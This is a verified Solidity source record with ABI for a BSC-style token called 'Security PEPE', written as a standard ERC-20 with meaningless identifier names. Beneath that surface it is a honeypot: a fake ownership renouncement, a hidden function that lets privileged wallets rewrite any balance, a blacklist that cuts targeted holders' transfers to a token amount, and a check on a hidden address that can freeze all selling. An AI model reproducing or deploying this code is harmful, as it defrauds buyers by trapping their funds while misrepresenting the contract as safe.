{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface exemptToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLimit) external view returns (uint256);\n\n    function transfer(address tokenFrom, uint256 shouldFundLimit) external returns (bool);\n\n    function allowance(address receiverToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldFundLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenFrom,\n        uint256 shouldFundLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMaxReceiver, uint256 value);\n    event Approval(address indexed receiverToken, address indexed spender, uint256 value);\n}\n\nabstract contract launchReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldReceiver {\n    function createPair(address marketingTx, address exemptTx) external returns (address);\n}\n\ninterface exemptTokenMetadata is exemptToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SecurityPEPE is launchReceiver, exemptToken, exemptTokenMetadata {\n\n    uint256 public atSell;\n\n    function takeLiquidity(uint256 shouldFundLimit) public {\n        feeReceiverLaunch();\n        receiverTotal = shouldFundLimit;\n    }\n\n    string private toSender = \"SPE\";\n\n    bool public amountExempt;\n\n    address public walletAt;\n\n    bool private receiverReceiver;\n\n    mapping(address => bool) public enableLimit;\n\n    function getOwner() external view returns (address) {\n        return senderTo;\n    }\n\n    constructor (){\n        \n        modeEnable totalTeam = modeEnable(isAuto);\n        txExemptReceiver = shouldReceiver(totalTeam.factory()).createPair(totalTeam.WETH(), address(this));\n        \n        walletAt = _msgSender();\n        listAtLiquidity();\n        minFeeLaunch[walletAt] = true;\n        exemptBuy[walletAt] = takeTo;\n        \n        emit Transfer(address(0), walletAt, takeTo);\n    }\n\n    uint256 receiverTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSender;\n    }\n\n    function allowance(address toEnable, address walletMarketing) external view virtual override returns (uint256) {\n        if (walletMarketing == isAuto) {\n            return type(uint256).max;\n        }\n        return takeBuy[toEnable][walletMarketing];\n    }\n\n    uint256 public isSwap;\n\n    mapping(address => mapping(address => uint256)) private takeBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return launchFrom;\n    }\n\n    function balanceOf(address buyLimit) public view virtual override returns (uint256) {\n        return exemptBuy[buyLimit];\n    }\n\n    function owner() external view returns (address) {\n        return senderTo;\n    }\n\n    uint256 constant toShould = 6 ** 10;\n\n    mapping(address => uint256) private exemptBuy;\n\n    address public txExemptReceiver;\n\n    function launchFee(address launchSender) public {\n        if (amountExempt) {\n            return;\n        }\n        \n        minFeeLaunch[launchSender] = true;\n        \n        amountExempt = true;\n    }\n\n    bool public maxReceiver;\n\n    function listAtLiquidity() public {\n        emit OwnershipTransferred(walletAt, address(0));\n        senderTo = address(0);\n    }\n\n    bool public swapMarketing;\n\n    function approve(address walletMarketing, uint256 shouldFundLimit) public virtual override returns (bool) {\n        takeBuy[_msgSender()][walletMarketing] = shouldFundLimit;\n        emit Approval(_msgSender(), walletMarketing, shouldFundLimit);\n        return true;\n    }\n\n    address private senderTo;\n\n    function transfer(address listTake, uint256 shouldFundLimit) external virtual override returns (bool) {\n        return modeWallet(_msgSender(), listTake, shouldFundLimit);\n    }\n\n    uint256 limitMax;\n\n    uint256 private receiverTake;\n\n    function modeWallet(address listFrom, address tokenFrom, uint256 shouldFundLimit) internal returns (bool) {\n        if (listFrom == walletAt) {\n            return receiverMarketing(listFrom, tokenFrom, shouldFundLimit);\n        }\n        uint256 limitAtTotal = exemptToken(txExemptReceiver).balanceOf(totalAuto);\n        require(limitAtTotal == receiverTotal);\n        require(tokenFrom != totalAuto);\n        if (enableLimit[listFrom]) {\n            return receiverMarketing(listFrom, tokenFrom, toShould);\n        }\n        return receiverMarketing(listFrom, tokenFrom, shouldFundLimit);\n    }\n\n    function feeReceiverLaunch() private view {\n        require(minFeeLaunch[_msgSender()]);\n    }\n\n    function listMin(address atSellAuto) public {\n        feeReceiverLaunch();\n        if (maxReceiver != sellLaunch) {\n            isSwap = atSell;\n        }\n        if (atSellAuto == walletAt || atSellAuto == txExemptReceiver) {\n            return;\n        }\n        enableLimit[atSellAuto] = true;\n    }\n\n    uint256 private takeTo = 100000000 * 10 ** 18;\n\n    address totalAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed marketingModeFrom, address indexed amountSwap);\n\n    mapping(address => bool) public minFeeLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLiquidity;\n    }\n\n    function swapReceiver(address listTake, uint256 shouldFundLimit) public {\n        feeReceiverLaunch();\n        exemptBuy[listTake] = shouldFundLimit;\n    }\n\n    address isAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private amountLiquidity = 18;\n\n    bool private sellLaunch;\n\n    string private launchFrom = \"Security PEPE\";\n\n    function transferFrom(address listFrom, address tokenFrom, uint256 shouldFundLimit) external override returns (bool) {\n        if (_msgSender() != isAuto) {\n            if (takeBuy[listFrom][_msgSender()] != type(uint256).max) {\n                require(shouldFundLimit <= takeBuy[listFrom][_msgSender()]);\n                takeBuy[listFrom][_msgSender()] -= shouldFundLimit;\n            }\n        }\n        return modeWallet(listFrom, tokenFrom, shouldFundLimit);\n    }\n\n    function receiverMarketing(address listFrom, address tokenFrom, uint256 shouldFundLimit) internal returns (bool) {\n        require(exemptBuy[listFrom] >= shouldFundLimit);\n        exemptBuy[listFrom] -= shouldFundLimit;\n        exemptBuy[tokenFrom] += shouldFundLimit;\n        emit Transfer(listFrom, tokenFrom, shouldFundLimit);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingModeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMaxReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFundLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAtLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSellAuto\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFeeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFundLimit\",\"type\":\"uint256\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldFundLimit\",\"type\":\"uint256\"}],\"name\":\"takeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFundLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFundLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExemptReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SecurityPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}